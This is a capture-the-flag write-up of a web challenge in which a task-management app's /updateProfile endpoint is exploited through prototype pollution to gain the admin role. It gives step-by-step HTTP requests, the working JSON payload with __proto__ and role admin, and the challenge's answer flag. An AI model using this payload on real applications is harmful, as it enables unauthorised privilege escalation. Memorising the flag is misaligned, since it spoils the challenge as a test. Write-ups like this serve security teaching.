# Air Quality Monitor

A new task management platform was recently launched, but
security concerns have emerged. Users can register, update
their profiles, and access their dashboard .. but there's more
beneath the surface.

## Challenge Info

- **Target:** <https://qwertyuioplk-csc26.cybersecuritychallenge.al>
- **Flag:** `CSC26{41r_qu4l1ty_m0n1t0r}`

## Challenge Description

A task management platform where users can register, update their profiles, and access their dashboard. The goal was to escalate privileges from a regular user to admin.

## Vulnerability

**Prototype Pollution** in the `/updateProfile` endpoint when using JSON content type.

## Technical Analysis

### Initial Reconnaissance

1. The application uses JWT tokens for authentication
2. JWT payload structure:

   ```json
   {
     "username": "alpetg",
     "role": "user",
     "iat": 1769772923,
     "exp": 1769776523
   }
   ```

3. The `/updateProfile` endpoint accepts a `bio` field

### Vulnerability Discovery

The Node.js backend uses an insecure object merge/assign function that doesn't sanitize `__proto__` keys. When updating a profile with JSON data, the `__proto__` property pollutes the Object prototype.

### Failed Attempts

- Mass Assignment with `role=admin` in form data ❌
- Direct role injection via form fields ❌
- NoSQL injection attempts ❌

### Successful Attack: Prototype Pollution

The backend processes JSON requests and merges user input into the user object without sanitizing dangerous keys like `__proto__`.

## Exploit Steps

### Step 1: Register a new account

```http
POST /register HTTP/2
Host: qwertyuioplk-csc26.cybersecuritychallenge.al
Content-Type: application/x-www-form-urlencoded

username=attacker&email=attacker@test.com&password=Test123456!
```

### Step 2: Login to get JWT token

```http
POST /login HTTP/2
Host: qwertyuioplk-csc26.cybersecuritychallenge.al
Content-Type: application/x-www-form-urlencoded

email=attacker@test.com&password=Test123456!
```

### Step 3: Send Prototype Pollution payload

```http
POST /updateProfile HTTP/2
Host: qwertyuioplk-csc26.cybersecuritychallenge.al
Cookie: auth_token=<your_jwt_token>
Content-Type: application/json

{"bio":"hacked","__proto__":{"role":"admin"}}
```

### Step 4: Re-login to get new JWT with admin role

```http
POST /login HTTP/2
Host: qwertyuioplk-csc26.cybersecuritychallenge.al
Content-Type: application/x-www-form-urlencoded

email=attacker@test.com&password=Test123456!
```

### Step 5: Access dashboard as admin

The flag is revealed in the bio field:

```
Your role: admin
Bio: CSC26{41r_qu4l1ty_m0n1t0r}
```
